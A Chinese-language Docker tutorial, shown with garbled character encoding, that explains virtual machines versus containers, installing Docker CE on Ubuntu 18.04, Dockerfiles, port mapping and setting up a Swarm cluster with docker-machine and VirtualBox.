¹æœ¬ä¸Šè§£å†³é—®é¢˜ã€‚è½¯ä»¶å¯ä»¥å¸¦ç¯å¢ƒå®‰è£…ã€‚ï¼ˆè¿™é‡Œè¯´çš„è½¯ä»¶æ˜¯æŒ‡æœ€ç»ˆè¦è¿è¡Œçš„å·¥ç¨‹ï¼‰ è™šæ‹Ÿæœºè™šæ‹Ÿæœºï¼ˆvirtual machineï¼Œç®€ç§°VMï¼‰å°±æ˜¯å¸¦ç¯å¢ƒå®‰è£…çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚å®ƒå¯ä»¥åœ¨ä¸€ä¸ªæ“ä½œç³»ç»Ÿä¸­è¿è¡Œå¦å¤–ä¸€ç§æ“ä½œç³»ç»Ÿã€‚æ¯”å¦‚åœ¨Windowsç³»ç»Ÿä¸­è¿è¡ŒLinux ç³»ç»Ÿã€‚åº”ç”¨ç¨‹åºå¯¹æ­¤æ¯«æ— æ„Ÿè§‰ï¼Œå› ä¸ºè™šæ‹Ÿæœºçœ‹ä¸Šå»è·ŸçœŸæ˜¯ç³»ç»Ÿä¸€æ¨¡ä¸€æ ·ã€‚è€Œå¯¹äºåº•å±‚ç³»ç»Ÿæ¥è¯´ï¼Œè™šæ‹Ÿæœºå°±æ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶ï¼Œä¸éœ€è¦å°±åˆ æ‰ï¼Œå¯¹å…¶ä»–éƒ¨åˆ†æ²¡æœ‰å½±å“ã€‚ è™šæ‹Ÿæœºï¼ˆVMï¼‰æ˜¯ç‰©ç†ç¡¬ä»¶çš„æŠ½è±¡ï¼Œ å°†ä¸€å°æœåŠ¡å™¨è½¬å˜ä¸ºå¤šå°æœåŠ¡å™¨ã€‚ è™½ç„¶ç”¨æˆ·å¯ä»¥é€šè¿‡è™šæ‹Ÿæœºè¿˜åŸè½¯ä»¶çš„åŸå§‹ç¯å¢ƒï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ¡ˆæœ‰å‡ ä¸ªç¼ºç‚¹ã€‚åœ¨åé¢ä¼šåšæ¯”è¾ƒã€‚ å®¹å™¨ç”±äºè™šæ‹Ÿæœºå­˜åœ¨ä¸€äº›ç¼ºç‚¹ï¼ŒLinux å‘å±•å‡ºäº†å¦ä¸€ç§è½»é‡çº§çš„æ“ä½œç³»ç»Ÿè™šæ‹ŸåŒ–è§£å†³æ–¹æ¡ˆï¼ŒLinux å®¹å™¨ï¼ˆLinux Containersï¼Œç¼©å†™ä¸º LXCï¼‰ã€‚ Linux å®¹å™¨ä¸æ˜¯æ¨¡æ‹Ÿä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿï¼Œè€Œæ˜¯å¯¹è¿›ç¨‹è¿›è¡Œéš”ç¦»ã€‚ å®¹å™¨æ˜¯åº”ç”¨å±‚çš„æŠ½è±¡ï¼Œå®ƒå°†ä»£ç å’Œä¾èµ–å…³ç³»æ‰“åŒ…åœ¨ä¸€èµ·ã€‚ å¤šä¸ªå®¹å™¨å¯ä»¥åœ¨åŒä¸€å°æœºå™¨ä¸Šè¿è¡Œï¼Œå¹¶ä¸å…¶ä»–å®¹å™¨å…±äº«æ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œæ¯ä¸ªå®¹å™¨åœ¨ç”¨æˆ·ç©ºé—´ä¸­ä½œä¸ºç‹¬ç«‹è¿›ç¨‹è¿è¡Œã€‚å®¹å™¨å ç”¨çš„ç©ºé—´æ¯”VMå°‘ï¼ˆå®¹å™¨æ˜ åƒçš„å¤§å°é€šå¸¸ä¸ºå‡ åMBï¼‰ï¼Œå¯ä»¥å¤„ç†æ›´å¤šçš„åº”ç”¨ç¨‹åºï¼Œå¹¶ä¸”éœ€è¦æ›´å°‘çš„VMå’Œæ“ä½œç³»ç»Ÿã€‚ ç”±äºå®¹å™¨æ˜¯è¿›ç¨‹çº§åˆ«çš„ï¼Œç›¸æ¯”è™šæ‹Ÿæœºæœ‰å¾ˆå¤šçš„ä¼˜åŠ¿ã€‚åé¢ä¼šåšæ¯”è¾ƒã€‚ Docker æ˜¯ä»€ä¹ˆDocker å±äºLinux å®¹å™¨çš„ä¸€ç§å°è£…ï¼Œæä¾›ç®€å•æ˜“ç”¨çš„å®¹å™¨ä½¿ç”¨æ¥å£ã€‚ å®ƒæ˜¯ç›®å‰æœ€æµè¡Œçš„ Linux å®¹å™¨è§£å†³æ–¹æ¡ˆã€‚ Docker ä¸è™šæ‹Ÿæœºçš„åŒºåˆ« åç§° å ç”¨èµ„æº å¯åŠ¨é€Ÿåº¦ çº§åˆ« Docker å ç”¨èµ„æºå°‘ å¯åŠ¨å¿« è½»é‡çº§ è™šæ‹Ÿæœº å ç”¨èµ„æºå¤š å¯åŠ¨æ…¢ é‡é‡çº§ Docker CE ä¸ Docker EEDocker CE(Docker Community Edition) æ˜¯ç¤¾åŒºç‰ˆï¼Œç®€å•ç†è§£æ˜¯å…è´¹ä½¿ç”¨ï¼Œæä¾›å°ä¼ä¸šä¸å°çš„ITå›¢é˜Ÿä½¿ç”¨,å¸Œæœ›ä»Dockerå¼€å§‹ï¼Œå¹¶å°è¯•åŸºäºå®¹å™¨çš„åº”ç”¨ç¨‹åºéƒ¨ç½²ã€‚ Docker EE(Docker Enterprise Edition) æ˜¯ä¼ä¸šç‰ˆï¼Œæ”¶è´¹ã€‚æä¾›åŠŸèƒ½æ›´å¼ºã€‚é€‚åˆå¤§ä¼ä¸šä¸æ‰“çš„ITå›¢é˜Ÿã€‚ä¸ºä¼ä¸šå¼€å‘å’ŒITå›¢é˜Ÿè®¾è®¡ï¼Œä»–ä»¬åœ¨ç”Ÿäº§ä¸­æ„å»ºã€äº¤ä»˜å’Œè¿è¡Œä¸šåŠ¡å…³é”®åº”ç”¨ç¨‹åº Docker CE æœ‰ä¸‰ç§ç±»å‹çš„æ›´æ–°é€šé“ï¼šstableã€testå’Œ nightly Stable æä¾›ä¸€èˆ¬å¯ç”¨æ€§çš„æœ€æ–°ç‰ˆæœ¬ Test æä¾›åœ¨ä¸€èˆ¬å¯ç”¨ä¹‹å‰å‡†å¤‡å¥½è¿›è¡Œæµ‹è¯•çš„é¢„å‘å¸ƒã€‚ Nightly æä¾›ä¸‹ä¸€ä¸ªä¸»è¦ç‰ˆæœ¬çš„æœ€æ–°æ­£åœ¨è¿›è¡Œçš„å·¥ä½œã€‚ å®‰è£… Docker-CEè¿™é‡Œä»¥Ubuntu 18.04 ä¸ºä¾‹ï¼š 1234561. sudo apt install apt-transport-https ca-certificates software-properties-common curl-transport-https ca-certificates software-properties-common curl2. curl -fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add --fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add -3. sudo add-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \\-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \\$(lsb_release -cs) stable&quot;4. sudo apt update5. sudo apt install docker-ce å°†å½“å‰ç”¨æˆ·æ·»åŠ åˆ°docker ç”¨æˆ·ç»„ï¼Œå¯ä»¥ä¸ç”¨sudo è¿è¡Œdocker 12$ sudo groupadd docker$ sudo usermod -aG docker $USER-aG docker $USER Docker é•œåƒDocker é•œåƒå°±æ˜¯ä¸€ä¸ªåªè¯»çš„æ¨¡æ¿ã€‚ ä¾‹å¦‚ï¼šä¸€ä¸ªé•œåƒå¯ä»¥åŒ…å«ä¸€ä¸ªå®Œæ•´çš„ ubuntu æ“ä½œç³»ç»Ÿç¯å¢ƒï¼Œé‡Œé¢ä»…å®‰è£…äº† Apache æˆ–ç”¨æˆ·éœ€è¦çš„å…¶å®ƒåº”ç”¨ç¨‹åºã€‚ é•œåƒå¯ä»¥ç”¨æ¥åˆ›å»º Docker å®¹å™¨ã€‚ Docker å®¹å™¨Docker åˆ©ç”¨å®¹å™¨æ¥è¿è¡Œåº”ç”¨ã€‚ å®¹å™¨æ˜¯ä»é•œåƒåˆ›å»ºçš„è¿è¡Œå®ä¾‹ã€‚å®ƒå¯ä»¥è¢«å¯åŠ¨ã€å¼€å§‹ã€åœæ­¢ã€åˆ é™¤ã€‚æ¯ä¸ªå®¹å™¨éƒ½æ˜¯ç›¸äº’éš”ç¦»çš„ã€ä¿è¯å®‰å…¨çš„å¹³å°ã€‚ å¯ä»¥æŠŠå®¹å™¨çœ‹åšæ˜¯ä¸€ä¸ªç®€æ˜“ç‰ˆçš„ Linux ç¯å¢ƒï¼ˆåŒ…æ‹¬rootç”¨æˆ·æƒé™ã€è¿›ç¨‹ç©ºé—´ã€ç”¨æˆ·ç©ºé—´å’Œç½‘ç»œç©ºé—´ç­‰ï¼‰å’Œè¿è¡Œåœ¨å…¶ä¸­çš„åº”ç”¨ç¨‹åºã€‚ æ³¨ï¼šé•œåƒæ˜¯åªè¯»çš„ï¼Œå®¹å™¨åœ¨å¯åŠ¨çš„æ—¶å€™åˆ›å»ºä¸€å±‚å¯å†™å±‚ä½œä¸ºæœ€ä¸Šå±‚ã€‚ Docker ä»“åº“ä»“åº“æ˜¯é›†ä¸­å­˜æ”¾é•œåƒæ–‡ä»¶çš„åœºæ‰€ã€‚æœ‰æ—¶å€™ä¼šæŠŠä»“åº“å’Œä»“åº“æ³¨å†ŒæœåŠ¡å™¨ï¼ˆRegistryï¼‰æ··ä¸ºä¸€è°ˆï¼Œå¹¶ä¸ä¸¥æ ¼åŒºåˆ†ã€‚å®é™…ä¸Šï¼Œä»“åº“æ³¨å†ŒæœåŠ¡å™¨ä¸Šå¾€å¾€å­˜æ”¾ç€å¤šä¸ªä»“åº“ï¼Œæ¯ä¸ªä»“åº“ä¸­åˆåŒ…å«äº†å¤šä¸ªé•œåƒï¼ˆimageï¼‰ï¼Œæ¯ä¸ªé•œåƒæœ‰ä¸åŒçš„æ ‡ç­¾ï¼ˆtagï¼‰ã€‚ ä»“åº“åˆ†ä¸ºå…¬å¼€ä»“åº“ï¼ˆPublicï¼‰å’Œç§æœ‰ä»“åº“ï¼ˆPrivateï¼‰ä¸¤ç§å½¢å¼ã€‚ æœ€å¤§çš„å…¬å¼€ä»“åº“æ˜¯ Docker Hubï¼Œå­˜æ”¾äº†æ•°é‡åºå¤§çš„é•œåƒä¾›ç”¨æˆ·ä¸‹è½½ã€‚ å›½å†…çš„å…¬å¼€ä»“åº“åŒ…æ‹¬ Docker Pool ç­‰ï¼Œå¯ä»¥æä¾›å¤§é™†ç”¨æˆ·æ›´ç¨³å®šå¿«é€Ÿçš„è®¿é—®ã€‚ å½“ç„¶ï¼Œç”¨æˆ·ä¹Ÿå¯ä»¥åœ¨æœ¬åœ°ç½‘ç»œå†…åˆ›å»ºä¸€ä¸ªç§æœ‰ä»“åº“ã€‚ å½“ç”¨æˆ·åˆ›å»ºäº†è‡ªå·±çš„é•œåƒä¹‹åå°±å¯ä»¥ä½¿ç”¨ push å‘½ä»¤å°†å®ƒä¸Šä¼ åˆ°å…¬æœ‰æˆ–è€…ç§æœ‰ä»“åº“ï¼Œè¿™æ ·ä¸‹æ¬¡åœ¨å¦å¤–ä¸€å°æœºå™¨ä¸Šä½¿ç”¨è¿™ä¸ªé•œåƒæ—¶å€™ï¼Œåªéœ€è¦ä»ä»“åº“ä¸Š pull ä¸‹æ¥å°±å¯ä»¥äº†ã€‚ æ³¨ï¼šDocker ä»“åº“çš„æ¦‚å¿µè·Ÿ Git ç±»ä¼¼ï¼Œæ³¨å†ŒæœåŠ¡å™¨å¯ä»¥ç†è§£ä¸º GitHub è¿™æ ·çš„æ‰˜ç®¡æœåŠ¡ã€‚ é•œåƒå’Œå®¹å™¨çš„åŒºåˆ«å®¹å™¨å’Œé•œåƒçš„å…³ç³»å¦‚ä¸‹ï¼š Dockerfileç”¨äºå®šä¹‰é•œåƒï¼Œä¾èµ–é•œåƒæ¥è¿è¡Œå®¹å™¨ï¼Œä»“åº“åˆ™æ˜¯å­˜æ”¾é•œåƒçš„åœ°æ–¹ã€‚ Dockerfile æ˜¯ä»€ä¹ˆï¼ŸDockerfile æ˜¯ä¸€ä¸ªåˆ›å»ºDocker é•œåƒæ‰€éœ€çš„æ–‡ä»¶ï¼Œå…¶ä¸­ä¼šåŒ…å«ä¸€ç»„æŒ‡ä»¤æ¥å‘Šè¯‰Docker å¦‚ä½•æ„å»ºæˆ‘ä»¬çš„é•œåƒã€‚ ç¤ºä¾‹ï¼š 123456789101112131415161718192021$ cat Dockerfile# ä½¿ç”¨å®˜æ–¹Pythonè¿è¡Œæ—¶ä½œä¸ºçˆ¶æ˜ åƒFROM python:2.7-slim# å°†å·¥ä½œç›®å½•è®¾ç½®ä¸º&#x2F;appWORKDIR &#x2F;app# å°†å½“å‰ç›®å½•å†…å®¹å¤åˆ¶åˆ°å®¹å™¨at &#x2F;appCOPY . &#x2F;app# å®‰è£…requirements.txtä¸­æŒ‡å®šçš„ä»»ä½•éœ€è¦çš„åŒ…RUN pip install --trusted-host pypi.python.org -r requirements.txt# #è®©80 ç«¯å£å·å¯¹å¤–å¼€æ”¾EXPOSE 80# å®šä¹‰ç¯å¢ƒå˜é‡ENV NAME World# åœ¨å®¹å™¨å¯åŠ¨æ—¶è¿è¡Œapp.pyCMD [&quot;python&quot;, &quot;app.py&quot;] å¦‚ä½•ç”¨é•œåƒåˆ›å»ºä¸€ä¸ªå®¹å™¨ï¼Ÿé¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªé•œåƒï¼Œç„¶åæ‰èƒ½åˆ›å»ºå®¹å™¨ã€‚æƒ³è¦åœ¨Docker ä¸Šåˆ›å»ºä¸€ä¸ªé•œåƒï¼Œéå¸¸ç®€å•ã€‚ cd åˆ°é¡¹ç›®æ–‡ä»¶å¤¹ä¸­ ä½¿ç”¨ docker build --tag=mydockerapp . å‘½ä»¤ï¼Œåˆ›å»ºä¸€ä¸ªDocker é•œåƒã€‚â€“tag é€‰é¡¹å‘½åã€‚ ä½¿ç”¨ docker run -d -p 4000:80 mydockerappå‘½ä»¤ï¼Œåˆ›å»ºä¸€ä¸ªæ–°å®¹å™¨ã€‚ è¯¥å‘½ä»¤è¡¨ç¤ºï¼šDocker ä»¥mydockerappé•œåƒåˆ›å»ºä¸€ä¸ªæ–°å®¹å™¨ï¼ŒåŒæ—¶ä»¥åˆ†ç¦»æ¨¡å¼åœ¨åå°è¿è¡Œè¯¥åº”ç”¨ç¨‹åºï¼Œå°†è¯¥å®¹å™¨çš„80ç«¯å£æ˜ å°„åˆ°ä¸»æœºçš„4000ç«¯å£ã€‚ å…¶ä¸­ï¼š-dï¼šè®©å®¹å™¨åœ¨åå°è¿è¡Œ-pï¼šå°†å®¹å™¨å†…éƒ¨ç«¯å£æ˜ å°„åˆ°æŒ‡å®šçš„ä¸»æœºç«¯å£ä¸Šã€‚-P :æ˜¯å®¹å™¨å†…éƒ¨ç«¯å£éšæœºæ˜ å°„åˆ°ä¸»æœºçš„ç«¯å£ä¸Šã€‚ Docker ç½‘ç»œç«¯å£æ˜ å°„ä½¿ç”¨å‘½ä»¤ï¼š 1$ docker run -p 4000:80 mydocker ç„¶åç”¨docker container lsæŸ¥çœ‹å®¹å™¨åˆ—è¡¨ ä¸‹å›¾çš„æ„æ€è¡¨ç¤ºï¼šå°†è¯¥å®¹å™¨çš„ç«¯å£80æ˜ å°„åˆ°4000ï¼Œä»è€Œç”Ÿæˆæ­£ç¡®çš„URL http://localhost:4000ã€‚ Docker å¼€æ”¾äº† 80 ç«¯å£æ˜ å°„åˆ°ä¸»æœºç«¯å£ 4000 ä¸Šã€‚ Docker å®¹å™¨è¿æ¥å‰é¢æˆ‘ä»¬å®ç°äº†é€šè¿‡ç½‘ç»œç«¯å£æ¥è®¿é—®è¿è¡Œåœ¨ docker å®¹å™¨å†…çš„æœåŠ¡ã€‚ä¸‹é¢æˆ‘ä»¬æ¥å®ç°é€šè¿‡ç«¯å£è¿æ¥åˆ°ä¸€ä¸ª docker å®¹å™¨ å¦‚ä½•è¿è¡Œè´Ÿè½½å‡è¡¡åº”ç”¨ï¼Ÿåœ¨å¼€å§‹ä¹‹å‰ï¼Œä½ å¾—é¦–å…ˆæ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š å®‰è£…Docker 1.13æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚ äº†è§£å¦‚ä½•åˆ›å»ºå®¹å™¨ã€‚ ç¡®ä¿å·²ç»åˆ›å»ºé•œåƒå¹¶å‘å¸ƒåˆ°æ³¨å†Œè¡¨ã€‚æˆ‘ä»¬åœ¨è¿™é‡Œéœ€è¦ä½¿ç”¨è¯¥å…±äº«é•œåƒã€‚ ç¡®ä¿é•œåƒä½œä¸ºå·²éƒ¨ç½²çš„å®¹å™¨è¿è¡Œï¼Œå¹¶èƒ½è®¿é—®ã€‚ ç¡®ä¿æœ‰docker-compose.ymlé…ç½®æ–‡ä»¶ï¼Œç„¶åä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ 1234567$ docker swarm init$ docker stack deploy -c docker-compose.yml getstartedlab# é¡ºåˆ©çš„è¯ï¼Œå°±èƒ½ç›´æ¥éƒ¨ç½²æˆåŠŸäº†ã€‚ä½¿ç”¨docker container ls å¯ä»¥çœ‹åˆ°æ­£åœ¨è¿è¡Œçš„å®ä¾‹ã€‚# ä½¿ç”¨ curl http:&#x2F;&#x2F;localhost:4000 æˆ–è€…æ˜¯åˆ·æ–°æµè§ˆå™¨ã€‚# æ— è®ºä»¥å“ªç§æ–¹å¼ï¼Œå®¹å™¨ID éƒ½ä¼šå‘ç”Ÿå˜åŒ–ã€‚ä»è€Œè¯æ˜è´Ÿè½½å‡è¡¡æˆåŠŸã€‚# å¯¹äºæ¯ä¸ªè¯·æ±‚ï¼Œä»¥å¾ªç¯æ–¹å¼é€‰æ‹©5ä¸ªä»»åŠ¡ä¸­çš„ä¸€ä¸ªæ¥å“åº”ã€‚# å®¹å™¨IDä¸ä¸Šä¸€ä¸ªå‘½ä»¤ï¼ˆdocker container ls -qï¼‰çš„è¾“å‡ºåŒ¹é…ã€‚ å…³äºæœåŠ¡åœ¨åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºä¸­ï¼Œåº”ç”¨ç¨‹åºçš„ä¸åŒéƒ¨åˆ†ç§°ä¸ºâ€œæœåŠ¡â€ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æƒ³è±¡ä¸€ä¸ªè§†é¢‘å…±äº«ç«™ç‚¹ï¼Œå®ƒå¯èƒ½åŒ…æ‹¬ä¸€ä¸ªç”¨äºåœ¨æ•°æ®åº“ä¸­å­˜å‚¨åº”ç”¨ç¨‹åºæ•°æ®çš„æœåŠ¡ï¼Œä¸€ä¸ªç”¨æˆ·åœ¨ä¸Šä¼ å†…å®¹ååœ¨åå°è¿›è¡Œè§†é¢‘è½¬ç çš„æœåŠ¡ï¼Œä¸€ä¸ªç”¨äºå‰ç«¯çš„æœåŠ¡ï¼Œç­‰ç­‰ã€‚ æœåŠ¡å®é™…ä¸Šåªæ˜¯â€œç”Ÿäº§ä¸­çš„å®¹å™¨â€ã€‚æœåŠ¡åªè¿è¡Œä¸€ä¸ªé•œåƒï¼Œä½†å®ƒç¼–ç äº†é•œåƒè¿è¡Œçš„æ–¹å¼ - å®ƒåº”è¯¥ä½¿ç”¨å“ªäº›ç«¯å£ï¼Œåº”è¯¥è¿è¡Œå¤šå°‘ä¸ªå®¹å™¨å‰¯æœ¬ï¼Œä»¥ä¾¿æœåŠ¡å…·æœ‰æ‰€éœ€çš„å®¹é‡ï¼Œä»¥åŠç­‰ç­‰ã€‚æ‰©å±•æœåŠ¡ä¼šæ›´æ”¹è¿è¡Œè¯¥è½¯ä»¶çš„å®¹å™¨å®ä¾‹çš„æ•°é‡ï¼Œä»è€Œä¸ºæµç¨‹ä¸­çš„æœåŠ¡åˆ†é…æ›´å¤šè®¡ç®—èµ„æºã€‚ åœ¨æœåŠ¡ä¸­è¿è¡Œçš„å•ä¸ªå®¹å™¨ç§°ä¸ºä»»åŠ¡ã€‚ä»»åŠ¡è¢«èµ‹äºˆä»¥æ•°å­—é€’å¢çš„å”¯ä¸€IDï¼Œæœ€å¤šä¸ºreplicasæ‚¨å®šä¹‰ çš„æ•°é‡docker-compose.ymlã€‚ å¹¸è¿çš„æ˜¯ï¼Œä½¿ç”¨Dockerå¹³å°å®šä¹‰ï¼Œè¿è¡Œå’Œæ‰©å±•æœåŠ¡éå¸¸å®¹æ˜“ - åªéœ€ç¼–å†™ä¸€ä¸ªdocker-compose.ymlæ–‡ä»¶å³å¯ã€‚ å¦‚ä½•åœ¨Dockerä¸Šå®‰è£… Docker Machineï¼ŸUbuntu 18.04 è¯·çœ‹æ–‡æœ«çš„å‚è€ƒé“¾æ¥ã€‚ MacOS å¦‚æœæ˜¯ä»DockerHubå®˜ç½‘ä¸‹è½½çš„dmg å®‰è£…çš„Dockerï¼Œä¸ç”¨æ‹…å¿ƒï¼ŒDocker-Machine å·²ç»å®‰è£…å¥½äº†ã€‚ å¦‚ä½•å®‰è£…VirtualBoxï¼ŸUbuntu 18.04 è¯·çœ‹æ–‡æœ«çš„å‚è€ƒé“¾æ¥ã€‚ MacOS åˆ™éœ€è¦ä»virtualboxå®˜ç½‘ä¸‹è½½dmgå®‰è£…åŒ…ã€‚ ä½ å¯èƒ½ä¼šé‡åˆ°ä¸€ä¸ªé”™è¯¯ï¼Œå‚è€ƒè§£å†³ï¼šå¦‚ä½•åœ¨MacOSä¸Šå®‰è£…VirtualBox äº†è§£Swarmé›†ç¾¤ç¾¤ç”±å¤šä¸ªèŠ‚ç‚¹ç»„æˆï¼Œå¯ä»¥æ˜¯ç‰©ç†æˆ–è™šæ‹Ÿæœºã€‚åŸºæœ¬æ¦‚å¿µå¾ˆç®€å•ï¼šè¿è¡Œdocker swarm initä»¥å¯ç”¨swarmæ¨¡å¼å¹¶ä½¿å½“å‰è®¡ç®—æœºæˆä¸ºä¸€ä¸ªswarmç®¡ç†å™¨ã€‚ è¿™ä¸ªç« èŠ‚æ˜¯è¿™ä¸ªæ–‡æ¡£ç³»åˆ—ä¸­å­¦çš„æ—¶é—´æœ€é•¿çš„ï¼Œå‘æœ‰ç‚¹å¤šï¼Œèµ°äº†ä¸å°‘å¼¯è·¯ï¼Œè¿™ä¸€èŠ‚ä¹ŸæŒºé‡è¦çš„ é‡ç‚¹è®°ä¸‹ç¬”è®°ã€‚ åœ¨MacOS ä¸‹ï¼Œéƒ¨åˆ†å‘½ä»¤éœ€è¦ sudo æƒé™ã€‚ åˆ›å»ºä¸€ä¸ªé›†ç¾¤ï¼ˆæœ¬åœ°è®¡ç®—æœºçš„VMï¼‰åœ¨å¼€å§‹è¿™éƒ¨åˆ†ä¹‹å‰ï¼Œéœ€è¦æå‰å®‰è£…å¥½Oracle VirtualBox. 1$ docker-machine create --driver virutalbox myvm1 å¦‚æœä½ æ”¶åˆ°äº†è¿™æ ·çš„ä¿¡æ¯ï¼š 12$ Error with pre-create check: &quot;VBoxManage not found. Make sure VirtualBox is installed and VBoxManage is in the path&quot; è¯´æ˜ä½ çš„Vritualboxè¿˜æ˜¯æ²¡æœ‰å®‰è£…å¥½ã€‚ æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„VM 1234$ docker-machine lsNAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORSmyvm1 - virtualbox Running tcp:&#x2F;&#x2F;192.168.99.104:2376 v17.06.2-cemyvm2 - virtualbox Running tcp:&#x2F;&#x2F;192.168.99.105:2376 v17.06.2-ce è¿™æ ·å°±æˆåŠŸçš„åˆ›å»ºäº†ä¸€å°VMï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¦å°†è¿™å°æœºå™¨ä½œä¸ºç®¡ç†å™¨ï¼Œç¬¬äºŒå°ä½œä¸ºå·¥ä½œè€…ã€‚ å¦å¤–å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå°½ç®¡æˆ‘åœ¨Ubuntu 18.04 ä¸Šåˆ†åˆ«å®‰è£…å¥½äº†docker-machineã€virtualboxï¼Œä½†å½“æˆ‘åˆ›å»º VM æ—¶ï¼Œæ€»æ˜¯ä¼šæç¤ºæˆ‘è®¡ç®—æœºæ²¡æœ‰å¼€å¯ä»€ä¹ˆè™šæ‹ŸåŒ–ï¼ˆBOISï¼‰ã€‚ åæ¥æˆ‘å¤§æ¦‚æƒ³æ˜ç™½äº†ï¼Œå¯èƒ½æ˜¯æˆ‘çš„é‚£å°æœåŠ¡å™¨çš„é…ç½®å¤ªä½äº†ï¼ŒçœŸçš„æ˜¯æŸä¸ªè®¾ç½®é¡¹æ²¡æœ‰å¯åŠ¨å¯¼è‡´çš„ã€‚ ä»Šå¤©åœ¨MacBook ä¸Šé‡æ–°æ“ä½œäº†ä¸€è¾¹ï¼Œå¼‚å¸¸é¡ºåˆ©ã€‚ è®°å½•ä¸€ä¸ªé—®é¢˜ï¼šä½¿ç”¨docker-machine create --driver virtualbox myvm1åˆ›å»ºVMæ—¶ï¼Œåˆ›å»ºæˆåŠŸäº†ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯æˆ‘æƒ³è¦çš„å®ä¾‹ã€‚å¾—åˆ°äº†ä»¥ä¸‹ä¿¡æ¯ï¼š 1234(default) Creating a new host-only adapter produced an error: hostonlyif create failed:(default) 0%...(default) Progress state: E_FAIL(default) VBoxManage.exe: error: Failed to create the host-only adapter æ‰¾äº†å¥½ä¹…ä¹Ÿæ²¡æœ‰æ‰¾åˆ°ç­”æ¡ˆï¼Œæœ€åæ˜¯æ€ä¹ˆè§£å†³çš„å‘¢ï¼Ÿé‡å¯æœºå™¨ï¼ˆåŠ ä¸Š sudoï¼‰ã€‚ å¯åŠ¨\\åœæ­¢ VM 12$ docker-machine start Name$ docker-machine stop Name åˆå§‹åŒ–Swarm å¹¶æ·»åŠ èŠ‚ç‚¹è¿™é‡Œæ˜¯ä¸€ä¸ªå°å‘ï¼Œä¹‹å‰åœ¨è¿™é‡Œæ ½äº†å¥½ä¹…ã€‚ è¿™é‡Œæœ‰ä¸¤ç§æ–¹å¼åˆå§‹åŒ–èŠ‚ç‚¹æˆ–è€…è¯´æ“ä½œ VMï¼ˆæ¨èç¬¬ä¸€ç§ï¼‰ï¼š ssh è¿æ¥VM å®ä¾‹ï¼Œåœ¨Docker VM Cli ä¸­æ‰§è¡Œå‘½ä»¤ 1234567$ docker-machine ssh myvm1docker@myvm1: $ docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;# &lt;myvm1 ip&gt; æŒ‡docker-machine ls å¯¹åº”çš„ ip# æ­£å¸¸ä¼šå¾—åˆ°è¿™æ ·ä¸€ä¸ªè¾“å‡ºTo add a worker to this swarm, run the following command: docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377 å°†myvm2 å®ä¾‹ä½œä¸ºå·¥ä½œè€…åŠ å…¥ï¼ˆæ–¹å¼ä¸€ï¼‰1234567$ docker-machine ssh myvm1docker@myvm1: $ docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377# æˆåŠŸï¼Œä¼šå¾—åˆ°è¿™æ ·çš„è¾“å‡ºThis node joined a swarm as a worker. ç›´æ¥é€šè¿‡ docker-machine ssh myvm1 æ‰§è¡Œç›¸åº”å‘½ä»¤ 12$ docker-machine ssh myvm1 &quot;docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;# åŒä¸Š å°†myvm2 å®ä¾‹ä½œä¸ºå·¥ä½œè€…åŠ å…¥ï¼ˆæ–¹å¼äºŒï¼‰æ‰§è¡Œä¸Šé¢å¾—åˆ°çš„è¾“å‡ºï¼š 123456$ docker-machine ssh myvm2 &quot; docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377&quot;# æˆåŠŸï¼Œä¼šå¾—åˆ°è¿™æ ·çš„è¾“å‡ºThis node joined a swarm as a worker. è¿™æ ·ï¼Œæˆ‘ä»¬å°±æˆåŠŸçš„åˆ›å»ºäº†ä¸€ä¸ªé›†ç¾¤ï¼Œå¹¶å°†ä¸€ä¸ªå·¥ä½œè€…ä½œä¸ºä¸€ä¸ªèŠ‚ç‚¹åŠ å…¥äº†ã€‚ åœ¨ç®¡ç†å™¨ä¸ŠæŸ¥çœ‹é›†ç¾¤ä¸­çš„èŠ‚ç‚¹ï¼š1234docker@myvm1: $ docker node lsID HOSTNAME STATUS AVAILABILITY MANAGER STATUSrihwohkh3ph38fhillhhb84sk * myvm1 Ready Active Leaderbrtu9urxwfd5j0zrmkubhpkbd myvm2 Ready Active ä¸ºä»€ä¹ˆä¸Šé¢è¦ä»‹ç»é‚£ä¸¤ç§ä¸ VM å®ä¾‹è¿›è¡Œäº¤äº’çš„æ–¹å¼å‘¢ï¼Ÿ å› ä¸ºä¼šå’Œåé¢çš„åœ¨é›†ç¾¤éƒ¨ç½²åº”ç”¨ç¨‹åºæœ‰ä¸€å®šè”ç³»ã€‚ 